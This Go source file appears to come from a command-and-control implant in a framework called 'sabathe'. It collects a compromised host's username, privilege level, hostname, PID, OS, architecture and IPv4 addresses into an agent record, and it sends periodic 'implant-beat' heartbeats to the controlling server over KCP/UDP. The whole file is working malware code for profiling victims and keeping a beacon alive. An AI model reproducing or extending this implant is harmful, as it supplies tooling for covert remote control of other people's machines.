package core

import (
	uuid "github.com/satori/go.uuid"
	"github.com/xtaci/kcp-go"
	"log"
	"net"
	"os"
	"os/user"
	"runtime"
	"sabathe/implant/config"
	"sabathe/server/mthod"
	"strings"
	"time"
)

func IsIPv4(address string) bool {
	return strings.Count(address, ":") < 2
}

// new Implant system information

func InitImplant(protocol string) *config.Implant {
	agent := &config.Implant{
		AgentId:      uuid.NewV4().String(),
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		PID:          os.Getpid(),
	}
	u, err := user.Current()
	if err != nil {
		return nil
	}
	if IsHighPriv() == true {
		agent.UserName = "(*) " + u.Username
	} else {
		agent.UserName = u.Username
	}

	agent.HostName, _ = os.Hostname()
	agent.ResponseUrl = "/" + mthod.RandomString(5)
	interfaces, err := net.Interfaces()
	if err != nil {
		return agent
	}
	for _, face := range interfaces {
		address, err := face.Addrs()
		if err == nil {
			for _, addr := range address {
				if IsIPv4(addr.String()) {
					agent.IPs = append(agent.IPs, addr.String())
				}
			}
		} else {
			return nil
		}
	}
	agent.Protocol = protocol
	return agent
}

func HartKBeat(conn *kcp.UDPSession, tick int) {
	t := time.Tick(time.Duration(tick) * time.Second)
	for _ = range t {
		if conn != nil {
			_, err := conn.Write([]byte("implant-beat"))
			if err != nil && strings.Contains(err.Error(), "closed") {
				_ = conn.Close()
				conn = nil
				log.Println("server is closed")
				break
			}
		}
	}
}
